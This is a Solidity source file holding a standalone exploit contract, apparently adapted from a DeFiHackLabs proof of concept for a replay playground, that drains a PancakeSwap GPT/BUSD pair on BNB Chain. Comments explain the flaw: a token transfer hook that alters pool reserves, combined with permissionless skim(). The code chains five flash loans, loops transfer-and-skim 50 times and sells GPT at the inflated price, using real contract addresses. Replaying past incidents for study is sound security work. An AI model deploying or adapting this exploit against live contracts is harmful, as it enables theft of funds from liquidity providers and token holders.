// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-GPT).
// The DeFiHackLabs PoC (test/GPT_exp.sol) runs the attack INLINE in the Foundry
// test contract `CSExp` (attacker = address(this); the DODO flash-loan callback
// `DPPFlashLoanCall` lives on the test itself), so there is no standalone exploit
// contract to deploy as-is. This contract is a faithful, self-contained copy of
// that inline attack (doFlashLoan + DPPFlashLoanCall + the attack body) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/GPT_exp.sol.
//
// Root cause (GPT token, unverified on-chain, reconstructed from output.txt):
// GPT's transfer hook performs AMM-mutating actions (removeLiquidity -> pair.burn,
// then a direct pair.swap that burns GPT out of the pair's own reserve) as a side
// effect of an ordinary transfer to the pair. This leaves the pair holding a
// balance that differs from its stored reserves (a skimmable surplus) without
// preserving the constant product `k`. Because PancakeSwap's skim() is
// permissionless, anyone can sweep that surplus. Repeatedly poking the hook
// (transferFrom 0.5 GPT -> pair) and skimming after each poke burns GPT out of the
// pool's reserve 50 times, driving the GPT price up; the attacker then sells the
// GPT it accumulated along the way at the inflated price.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract GPTDrain {
    IDPPOracle constant oracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle constant oracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle constant oracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle constant oracle4 = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle constant oracle5 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    IPancakePair constant pair = IPancakePair(0x77a684943aA033e2E9330f12D4a1334986bCa3ef);
    IPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant GPT = IERC20(0xa1679abEF5Cd376cC9A1C4c2868Acf52e08ec1B3);

    // step 0: kick off the nested 5-deep DODO flash-loan cascade (liquidity sourcing only).
    function run() external {
        doFlashLoan(oracle1);
    }

    function doFlashLoan(IDPPOracle oracle) internal {
        oracle.flashLoan(0, BUSD.balanceOf(address(oracle)), address(this), abi.encode(uint256(0)));
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata) external {
        if (msg.sender == address(oracle1)) {
            doFlashLoan(oracle2);
        } else if (msg.sender == address(oracle2)) {
            doFlashLoan(oracle3);
        } else if (msg.sender == address(oracle3)) {
            doFlashLoan(oracle4);
        } else if (msg.sender == address(oracle4)) {
            doFlashLoan(oracle5);
        } else {
            // Start attack — all 5 flash loans are now open.
            pair.sync();
            BUSD.approve(address(router), type(uint256).max);
            address[] memory path = new address[](2);
            path[0] = address(BUSD);
            path[1] = address(GPT);
            router.swapExactTokensForTokens(100_000 ether, 0, path, address(this), block.timestamp + 100);

            GPT.approve(address(this), type(uint256).max);
            for (uint256 i = 0; i < 50; ++i) {
                // Poke GPT's transfer hook against the pair (removeLiquidity + burn-swap
                // shrink the pair's GPT reserve without preserving k), then skim the
                // surplus the hook leaves un-synced.
                GPT.transferFrom(address(this), address(pair), 0.5 ether);
                pair.skim(address(this));
            }

            // Cash out the GPT accumulated across the loop at the now-inflated price.
            path[0] = address(GPT);
            path[1] = address(BUSD);
            uint256 outAmount = router.getAmountsOut(GPT.balanceOf(address(this)), path)[1];
            GPT.transfer(address(pair), GPT.balanceOf(address(this)));
            pair.swap(outAmount, 0, address(this), bytes(""));
        }

        // Repay this level of the flash-loan cascade.
        BUSD.transfer(msg.sender, quoteAmount);
    }
}
